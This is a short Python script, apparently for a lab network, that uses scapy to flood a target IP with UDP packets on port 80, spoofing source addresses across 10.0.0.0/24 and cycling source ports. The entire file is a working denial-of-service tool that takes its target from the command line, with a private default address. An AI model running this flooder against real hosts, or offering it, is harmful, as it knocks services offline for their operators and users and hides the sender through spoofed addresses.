#!/usr/bin/python3

from scapy.all import *

import sys
import random
import argparse

def flood(dst_ip, src_ip=""):


    packet = Ether()/IP(src="10.0.0.0/24", dst=dst_ip)/UDP(sport=range(1000,65535), dport=80)/("1"*1000)
    #packet_list.append(packet)
    sendp(packet, iface="eth1")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        dst_ip = sys.argv[1]
    else:
        dst_ip = "172.16.10.123"
    flood(dst_ip)

